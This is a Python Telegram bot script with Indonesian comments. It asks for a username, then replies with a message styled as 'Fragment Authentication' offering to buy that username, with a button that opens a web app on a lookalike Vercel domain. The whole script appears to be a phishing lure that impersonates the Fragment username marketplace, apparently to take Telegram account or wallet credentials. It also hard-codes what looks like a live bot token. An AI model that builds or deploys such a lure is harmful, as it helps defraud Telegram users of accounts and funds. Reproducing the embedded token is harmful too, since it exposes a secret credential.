import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# =================================================================
#               KONFIGURASI WAJIB DIGANTI
# =================================================================
# Ganti dengan Bot Token Anda dari BotFather
TOKEN = "7968573254:AAEDR8cvaIdrK2QdG-h9MTfpecXuupjQ_Gs"

# Ganti dengan URL LENGKAP Vercel Anda (misalnya: https://ton-app-xxxxxx.vercel.app/index.html)
# URL ini HARUS PERSIS sama dengan URL Mini App Anda di Vercel.
WEB_APP_URL = "https://fragment-authentication.vercel.app/" 
# =================================================================


# Konfigurasi Logging standar
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- Handlers ---

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Menanggapi perintah /start dan meminta username."""
    await update.message.reply_text(
        "give username :"
    )

async def handle_username_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Menerima input username dan mengirimkan tombol Web App STATIS."""
    
    chat_id = update.effective_chat.id
    username_input = update.message.text.strip().replace('@', '') 
    
    if not username_input or len(username_input) < 3:
        await update.message.reply_text("Username tidak valid.")
        return

    # 1. Konstruksi Pesan Balasan
    reply_text = (
        f"Fragment Authentication : Direct offer to sell your username @{username_input}"
    )
    
    # 2. Konstruksi Tombol Web App (MENGGUNAKAN URL STATIS)
    # Karena ini statis, kita tidak menambahkan parameter ?username=
    keyboard = [
        [
            InlineKeyboardButton(
                "View Detail", 
                web_app=WebAppInfo(url=WEB_APP_URL) # URL statis TANPA parameter
            )
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # 3. Kirim Pesan dengan Tombol
    await context.bot.send_message(
        chat_id=chat_id,
        text=reply_text,
        reply_markup=reply_markup
    )

# --- Fungsi Utama ---

def main() -> None:
    """Mulai Bot dan daftarkan handlers."""
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_username_input))

    logger.info("Bot sedang berjalan dan siap untuk menerima pesan...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()